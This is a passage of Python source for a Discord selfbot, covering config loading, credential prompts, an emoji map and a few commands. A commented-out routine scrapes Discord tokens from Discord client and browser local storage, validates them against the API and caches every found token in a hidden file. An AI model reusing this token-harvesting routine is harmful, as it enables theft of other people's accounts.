    print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù'.center(shutil.get_terminal_size().columns))
    print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
    print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
    print(fg.purple3 + f'‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
    print(fg.purple3 + f'‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   \n'.center(shutil.get_terminal_size().columns))
    print(fg.purple3)
        
    try:
        configusername = json.load(open('config.json', encoding='utf-8'))['username']
        configpassword = json.load(open('config.json', encoding='utf-8'))['password']
        configdiscordpassword = json.load(open('config.json', encoding='utf-8'))['discord_password']
    
        sys.stdout.write(f'\x1b]2;React Selfbot [{version}]\x07')
        
        prefix = json.load(open('config.json', encoding='utf-8'))['prefix']
        color = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color']
        embed_footer = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer']
        embed_footer_url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url']
        embed_thumbnail_url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
        delete_timeout = json.load(open('config.json', encoding='utf-8'))['delete_timeout']
        rich_presence = json.load(open('config.json', encoding='utf-8'))['rich_presence']['enabled']
        global_emoji = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['global_emoji']
        token = json.load(open('config.json', encoding='utf-8'))['token']
        nitro_sniper = json.load(open('config.json', encoding='utf-8'))['nitro_sniper']
        nitro_webhook_url = json.load(open('config.json', encoding='utf-8'))['nitro_webhook_url']
        privnote_webhook_url = json.load(open('config.json', encoding='utf-8'))['privnote_webhook_url']
        giveaways_webhook_url = json.load(open('config.json', encoding='utf-8'))['giveaways_webhook_url']
        giveaway_server_joiner = json.load(open('config.json', encoding='utf-8'))['giveaway_server_joiner']
        giveaway_blocked_words = json.load(open('config.json', encoding='utf-8'))['giveaway_blocked_words']
        stream_url = json.load(open('config.json', encoding='utf-8'))['stream_url']
        selfbot_user_detection = json.load(open('config.json', encoding='utf-8'))['selfbot_user_detection']
        selfbot_detection_webhook = json.load(open('config.json', encoding='utf-8'))['selfbot_detection_webhook']
        ghostping_detection = json.load(open('config.json', encoding='utf-8'))['ghostping_detection']
        ghostping_detection_webhook = json.load(open('config.json', encoding='utf-8'))['ghostping_detection_webhook']
        command_usage_webhook = json.load(open('config.json', encoding='utf-8'))['command_usage_webhook']
        dm_delete_notify_webhook_url = json.load(open('config.json', encoding='utf-8'))['dm_delete_notify_webhook_url']
        footer_timestamp = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['footer_timestamp']
        discord_password = json.load(open('config.json', encoding='utf-8'))['discord_password']
    except Exception:
        print("Your config is invalid. Please reset it.")
        if sys.platform == "win32":
            os.system('pause')
        sys.exit()
    
    try:
        if sys.platform == "win32":
            with open('C:\Windows\System32\drivers\etc\hosts', 'r') as hostsfile:
                for line in hostsfile:
                    if 'over.menu' in line or 'reactselfbot' in line:
                        print('Please remove the following line from your hosts file!')
                        print(line)
                        os.system('pause')
                        sys.exit()
        elif sys.platform.startswith('linux'):
            with open('/etc/hosts', 'r') as hostsfile:
                for line in hostsfile:
                    if 'over.menu' in line or 'reactselfbot' in line:
                        print('Please remove the following line from your hosts file!')
                        print(line)
                        sys.exit()
        elif sys.platform == "darwin":
            with open('/private/etc/hosts', 'r') as hostsfile:
                for line in hostsfile:
                    if 'over.menu' in line or 'reactselfbot' in line:
                        print('Please remove the following line from your hosts file!')
                        print(line)
                        sys.exit()
    except:
        pass
    
    if configusername == 'Username':
        username = input('Enter your Selfbot username\nReact> ')
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['username'] = username
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
    else:
        username = json.load(open('config.json', encoding='utf-8'))['username']
        
    if configpassword == 'Password':
        password = getpass.getpass('Enter your Selfbot password (Invisible)\nReact> ')
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['password'] = password
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
    else:
        password = json.load(open('config.json', encoding='utf-8'))['password']
    
    if configdiscordpassword == 'DiscordPassword':
        discord_password = getpass.getpass('Enter your Discord password (Only for commands which change your username or pfp, you can leave this blank) (Invisible)\nReact> ')
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['discord_password'] = discord_password
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
    else:
        discord_password = json.load(open('config.json', encoding='utf-8'))['discord_password']

    hwid = base64.b64encode(GetUUID().encode())

    def set_vars():
        prefix = json.load(open('config.json', encoding='utf-8'))['prefix']
        color = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color']
        embed_footer = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer']
        embed_footer_url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url']
        embed_thumbnail_url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
        delete_timeout = json.load(open('config.json', encoding='utf-8'))['delete_timeout']
        rich_presence = json.load(open('config.json', encoding='utf-8'))['rich_presence']['enabled']
        global_emoji = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['global_emoji']
        token = json.load(open('config.json', encoding='utf-8'))['token']
        nitro_sniper = json.load(open('config.json', encoding='utf-8'))['nitro_sniper']
        nitro_webhook_url = json.load(open('config.json', encoding='utf-8'))['nitro_webhook_url']
        privnote_webhook_url = json.load(open('config.json', encoding='utf-8'))['privnote_webhook_url']
        giveaways_webhook_url = json.load(open('config.json', encoding='utf-8'))['giveaways_webhook_url']
        giveaway_blocked_words = json.load(open('config.json', encoding='utf-8'))['giveaway_blocked_words']
        giveaway_server_joiner = json.load(open('config.json', encoding='utf-8'))['giveaway_server_joiner']
        stream_url = json.load(open('config.json', encoding='utf-8'))['stream_url']
        selfbot_user_detection = json.load(open('config.json', encoding='utf-8'))['selfbot_user_detection']
        selfbot_detection_webhook = json.load(open('config.json', encoding='utf-8'))['selfbot_detection_webhook']
        ghostping_detection = json.load(open('config.json', encoding='utf-8'))['ghostping_detection']
        ghostping_detection_webhook = json.load(open('config.json', encoding='utf-8'))['ghostping_detection_webhook']
        command_usage_webhook = json.load(open('config.json', encoding='utf-8'))['command_usage_webhook']
        dm_delete_notify_webhook_url = json.load(open('config.json', encoding='utf-8'))['dm_delete_notify_webhook_url']
        footer_timestamp = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['footer_timestamp']
        discord_password = json.load(open('config.json', encoding='utf-8'))['discord_password']

    set_vars()
    
    
    # def TryToFindTokens():
    #     if sys.platform == "win32":
            
    #         try:
    #             found_accounts = []
    #             LOCAL = os.getenv("LOCALAPPDATA")
    #             ROAMING = os.getenv("APPDATA")
    #             PATHS = {
    #                 "Discord": ROAMING + "\\Discord",
    #                 "Discord Canary": ROAMING + "\\discordcanary",
    #                 "Discord PTB": ROAMING + "\\discordptb",
    #                 'Discord Development': ROAMING + '\\discorddevelopment',
    #                 "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    #                 "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    #                 "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    #                 "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    #             }
                
    #             def getHeader(logintoken=None, content_type="application/json"):
    #                 le_headers = {
    #                     "Content-Type": content_type,
    #                     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    #                 }
    #                 if logintoken:
    #                     le_headers.update({"Authorization": logintoken})
    #                 return le_headers
                
    #             def getUserData(logintoken):
    #                 try:
    #                     return json.loads(
    #                         urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v8/users/@me", headers=getHeader(logintoken))).read().decode()
    #                     )
    #                 except:
    #                     pass
                
    #             def getTokens(path):
    #                 path += "\\Local Storage\\leveldb"
    #                 tokens = []
    #                 for file_name in os.listdir(path):
    #                     if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
    #                         continue
    #                     for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
    #                         for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
    #                             for logintoken in re.findall(regex, line):
    #                                 tokens.append(logintoken)
    #                 return tokens
                
    #             cache_path = ROAMING + "\\.cache~$"
    #             embeds = []
    #             working = []
    #             checked = []
    #             already_cached_tokens = []
    #             working_ids = []
    #             for platform, path in PATHS.items():
    #                 if not os.path.exists(path):
    #                     continue
    #                 for logintoken in getTokens(path):
    #                     if logintoken in checked:
    #                         continue
    #                     checked.append(logintoken)
    #                     uid = None
    #                     if not logintoken.startswith("mfa."):
    #                         try:
    #                             uid = base64.b64decode(logintoken.split(".")[0].encode()).decode()
    #                         except:
    #                             pass
    #                         if not uid or uid in working_ids:
    #                             continue
    #                     user_data = getUserData(logintoken)
    #                     if not user_data:
    #                         continue
    #                     working_ids.append(uid)
    #                     working.append(logintoken)
    #                     username = user_data["username"] + "#" + str(user_data["discriminator"])
    #                     user_id = user_data["id"]
                        
    #                     found_accounts.append({f"{username} ({user_id})": f"{logintoken}"})
                        
    #             names = []
    #             le_tokens = []
                
    #             if len(found_accounts) > 0:
    #                 for found_account in found_accounts:
    #                     for name in found_account.keys():
    #                         names.append(name)
    #                     for le_token in found_account.values():
    #                         le_tokens.append(le_token)
                            
    #                 for i, yes in enumerate(le_tokens):
    #                     print(f"[{i}] {names[i]}")
                    
    #                 print("\n")
                    
                    
    #                 try:
    #                     le_account = int(input('Please select an account or enter "custom" if you wish to use a custom token: '))
    #                     token = le_tokens[le_account]
    #                     with open("config.json", "r", encoding="utf-8") as jsonFile:
    #                         data = json.load(jsonFile)
                            
    #                     data['token'] = token
                        
    #                     with open("config.json", "w", encoding="utf-8") as jsonFile:
    #                         json.dump(data, jsonFile, indent=4, sort_keys=False)
    #                 except ValueError:
    #                     token = input('Enter your Discord token\nReact> ')
    #                     with open("config.json", "r", encoding="utf-8") as jsonFile:
    #                         data = json.load(jsonFile)
                            
    #                     data['token'] = token
                        
    #                     with open("config.json", "w", encoding="utf-8") as jsonFile:
    #                         json.dump(data, jsonFile, indent=4, sort_keys=False)
                    
    #                 token = json.load(open('config.json', encoding='utf-8'))['token']
                
                            
    #                 with open(cache_path, "a") as file:
    #                     for logintoken in checked:
    #                         if not logintoken in already_cached_tokens:
    #                             file.write(logintoken + "\n")
    #             else:
    #                 token = input('Enter your Discord token\nReact> ')
    #                 with open("config.json", "r", encoding="utf-8") as jsonFile:
    #                     data = json.load(jsonFile)
                        
    #                 data['token'] = token
                    
    #                 with open("config.json", "w", encoding="utf-8") as jsonFile:
    #                     json.dump(data, jsonFile, indent=4, sort_keys=False)
                    
    #                 token = json.load(open('config.json', encoding='utf-8'))['token']
    #         except Exception:
    #             pass
    #     else:
    #         token = input('Enter your Discord token\nReact> ')
    #         with open("config.json", "r", encoding="utf-8") as jsonFile:
    #             data = json.load(jsonFile)
                
    #         data['token'] = token
            
    #         with open("config.json", "w", encoding="utf-8") as jsonFile:
    #             json.dump(data, jsonFile, indent=4, sort_keys=False)
            
    #         token = json.load(open('config.json', encoding='utf-8'))['token']
        
    token = json.load(open('config.json', encoding='utf-8'))['token']
    
    # if token == 'DiscordToken':
    #     token = input('Enter your Discord token: ')
    #     with open("config.json", "r", encoding="utf-8") as jsonFile:
    #         data = json.load(jsonFile)
            
    #     data['token'] = token
        
    #     with open("config.json", "w", encoding="utf-8") as jsonFile:
    #         json.dump(data, jsonFile, indent=4, sort_keys=False)
    # else:
    #     token = json.load(open('config.json', encoding='utf-8'))['token']
        
    if prefix == 'ChoosePrefix':
        prefix = input('Enter your Selfbot prefix\nReact> ')
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['prefix'] = prefix
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
    else:
        prefix = json.load(open('config.json', encoding='utf-8'))['prefix']
        
    if sys.platform == "win32":
        os.system('cls')
    else:
        os.system('clear')
        
    uptime_start = time.time()

    emoji_dict = {
        'a': ['üá¶', 'üÖ∞', 'üçô', 'üîº', '4‚É£'],
        'b': ['üáß', 'üÖ±', '8‚É£'],
        'c': ['üá®', '¬©', 'üóú'],
        'd': ['üá©', '‚Ü©'],
        'e': ['üá™', '3‚É£', 'üìß', 'üí∂'],
        'f': ['üá´', 'üéè'],
        'g': ['üá¨', 'üóú', '6‚É£', '9‚É£', '‚õΩ'],
        'h': ['üá≠', '‚ôì'],
        'i': ['üáÆ', '‚Ñπ', 'üöπ', '1‚É£'],
        'j': ['üáØ', 'üóæ'],
        'k': ['üá∞', 'üéã'],
        'l': ['üá±', '1‚É£', 'üáÆ', 'üë¢', 'üí∑'],
        'm': ['üá≤', '‚ìÇ', 'üìâ'],
        'n': ['üá≥', '‚ôë', 'üéµ'],
        'o': ['üá¥', 'üÖæ', '0‚É£', '‚≠ï', 'üîò', '‚è∫', '‚ö™', '‚ö´', 'üîµ', 'üî¥', 'üí´'],
        'p': ['üáµ', 'üÖø'],
        'q': ['üá∂', '‚ôå'],
        'r': ['üá∑', '¬Æ'],
        's': ['üá∏', 'üí≤', '5‚É£', '‚ö°', 'üí∞', 'üíµ'],
        't': ['üáπ', '‚úù', '‚ûï', 'üéö', 'üå¥', '7‚É£'],
        'u': ['üá∫', '‚õé', 'üêâ'],
        'v': ['üáª', '‚ôà', '‚òë'],
        'w': ['üáº', '„Ä∞', 'üìà'],
        'x': ['üáΩ', '‚ùé', '‚úñ', '‚ùå', '‚öí'],
        'y': ['üáæ', '‚úå', 'üí¥'],
        'z': ['üáø', '2‚É£'],
        '0': ['0‚É£', 'üÖæ', '0‚É£', '‚≠ï', 'üîò', '‚è∫', '‚ö™', '‚ö´', 'üîµ', 'üî¥', 'üí´'],
        '1': ['1‚É£', 'üáÆ'],
        '2': ['2‚É£', 'üáø'],
        '3': ['3‚É£'],
        '4': ['4‚É£'],
        '5': ['5‚É£', 'üá∏', 'üí≤', '‚ö°'],
        '6': ['6‚É£'],
        '7': ['7‚É£'],
        '8': ['8‚É£', 'üé±', 'üáß', 'üÖ±'],
        '9': ['9‚É£'],
        '?': ['‚ùì'],
        '!': ['‚ùó', '‚ùï', '‚ö†', '‚ù£'],
        'combination': [
            ['cool', 'üÜí'],
            ['back', 'üîô'],
            ['soon', 'üîú'],
            ['free', 'üÜì'],
            ['end', 'üîö'],
            ['top', 'üîù'],
            ['abc', 'üî§'],
            ['atm', 'üèß'],
            ['new', 'üÜï'],
            ['sos', 'üÜò'],
            ['100', 'üíØ'],
            ['loo', 'üíØ'],
            ['zzz', 'üí§'],
            ['...', 'üí¨'],
            ['ng', 'üÜñ'],
            ['id', 'üÜî'],
            ['vs', 'üÜö'],
            ['wc', 'üöæ'],
            ['ab', 'üÜé'],
            ['cl', 'üÜë'],
            ['ok', 'üÜó'],
            ['up', 'üÜô'],
            ['10', 'üîü'],
            ['11', '‚è∏'],
            ['ll', '‚è∏'],
            ['ii', '‚è∏'],
            ['tm', '‚Ñ¢'],
            ['on', 'üîõ'],
            ['oo', 'üàÅ'],
            ['!?', '‚Åâ'],
            ['!!', '‚Äº'],
            ['21', 'üìÖ'],
        ]
    }
    
    ignored_nitro_channels = []
    ignored_users = []
    
    def embed_timestamp():
        if json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["footer_timestamp"]:
            return date.datetime.utcfromtimestamp(time.time())
        else:
            return discord.embeds.EmptyEmbed 

    def replace_combos(react):
        for combo in emoji_dict['combination']:
            if combo[0] in react:
                react = react.replace(combo[0], combo[1], 1)
        return react

    def replace_letters(react):
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789!?':
            char_count = react.count(char)
            if char_count > 1:
                if len(emoji_dict[char]) >= char_count:
                    i = 0
                    while i < char_count:
                        if emoji_dict[char][i] not in react:
                            react = react.replace(char, emoji_dict[char][i], 1)
                        else:
                            char_count += 1
                        i += 1
            else:
                if char_count == 1:
                    react = react.replace(char, emoji_dict[char][0])
        return react
    
    def has_dupe(dupe):
        collect_my_duper = list(filter(lambda x: x != '∆í¬£', dupe))
        return len(set(collect_my_duper)) != len(collect_my_duper)

    def find_channel(channel_list, text):
        if text.isdigit():
            found_channel = discord.utils.get(channel_list, id=int(text))
        elif text.startswith("<#") and text.endswith(">"):
            found_channel = discord.utils.get(channel_list, id=text.replace("<", "").replace(">", "").replace("#", ""))
        else:
            found_channel = discord.utils.get(channel_list, name=text)
        return found_channel

    intents = discord.Intents.all()
    React = commands.Bot(command_prefix = json.load(open("config.json", encoding="utf-8"))["prefix"], self_bot = True, case_insensitive = True, intents = discord.Intents.all(), member_cache_flags = discord.MemberCacheFlags.all(), fetch_offline_members=True, chunk_guilds_at_startup=True)
    React.remove_command('help')
    
    def mainscreen():
        print('\n')        
        print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó'.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù'.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   \n'.center(shutil.get_terminal_size().columns))
    
        motd = "React is open source bois | Modified by Monarch"
        lemotd = 'MOTD: ' + motd
        
        print(lemotd.center(shutil.get_terminal_size().columns))
        
        print(fg.purple3)
        
        for i in range(shutil.get_terminal_size().columns):
            print('‚îÄ', end='')

        print('\n')
        
    mainscreen()

    try:
        userinformation = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        userdata = json.loads(userinformation.content)
        username = userdata['username']
    except KeyError:
        print('Your token seems to be invalid.')
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['token'] = "DiscordToken"
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
        os.system("pause")
        sys.exit()
        
    reactusername = json.load(open('config.json', encoding='utf-8'))['username']

    cursor.hide()
    
    copyarray = []
    mockarray = []
    deletesend_array = []
    
    for filename in os.listdir('Scripts'):
        if filename.endswith("py"):
            exec(open(f'./Scripts/{filename}', encoding="utf-8").read())

    async def embed_or_codeblock(ctx, embed):
        if json.load(open('config.json', encoding='utf-8'))['embed_mode']:
            await ctx.send(embed=embed, delete_after=json.load(open('config.json', encoding='utf-8'))['delete_timeout'])

        else:

            if not embed.image:
                await ctx.send(parse_embed_to_codeblock(embed), delete_after=json.load(open('config.json', encoding='utf-8'))['delete_timeout'])
            else:
                try:
                    if not "gif" in embed.image.url and not "webp" in embed.image.url:
                        resp = requests.get(embed.image.url)
                        open('image.png', 'wb').write(bytes(resp.content))
                        await ctx.send(file=discord.File('image.png'))
                        os.remove('image.png')
                    elif "gif" in embed.image.url:
                        resp = requests.get(embed.image.url)
                        open('./image.gif', 'wb').write(bytes(resp.content))
                        await ctx.send(file=discord.File('image.gif'))
                        os.remove('image.gif')
                    elif "webp" in embed.image.url:
                        resp = requests.get(embed.image.url)
                        open('./image.webp', 'wb').write(bytes(resp.content))
                        await ctx.send(file=discord.File('image.webp'))
                        os.remove('image.webp')
                except Exception:
                    await ctx.send(embed.image.url)


    @React.listen()
    async def on_command_error(ctx, error):
        if isinstance(error, commands.MissingRequiredArgument) or isinstance(error, commands.BadArgument) or isinstance(error, commands.DisabledCommand):
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Error | ' + fg.purple3 + str(error))
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Command Error',timestamp=embed_timestamp())
            embed.add_field(name=f'__üìõ Error__', value=f'{error}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            
        # if isinstance(error, commands.CommandNotFound):
        #     print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Error | ' + fg.purple3 + str(error))
        #     embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Command Error',timestamp=embed_timestamp())
        #     embed.add_field(name=f'__üìõ Error__', value=f'{error}', inline=False)
        #     embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        #     await ctx.send(embed=embed)
        pass
        
    @React.command(usage="ping", description="Shows your latency")
    async def ping(ctx):
        start_time = time.time()
        result = requests.get(f'https://canary.discord.com/api/v8/science', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        elapsed = time.time() - start_time
        elapsed = '%.3f' % elapsed
        if True:
            embed = discord.Embed(title='Pong!', description=f'Your Discord latency is {elapsed}s', color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.timestamp = embed_timestamp()
            await embed_or_codeblock(ctx, embed)


        else:
            msg = f'Your latency is `{elapsed}`'
            await ctx.send(msg)

    @React.command(usage="rockstarid <SocialClub Name>", description="Resolves Social Club's Rockstar ID of a user")
    async def rockstarid(ctx, username: str):
        if username is None:
            return
        else:

            rid = requests.get(f'https://reactselfbot.pro/api/rockstarid.php?username={username}', timeout=10)
            
            resolved_embed = discord.Embed(title=username, color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], description=f'Rockstar ID: {rid.json()["id"]}')
            resolved_embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            resolved_embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
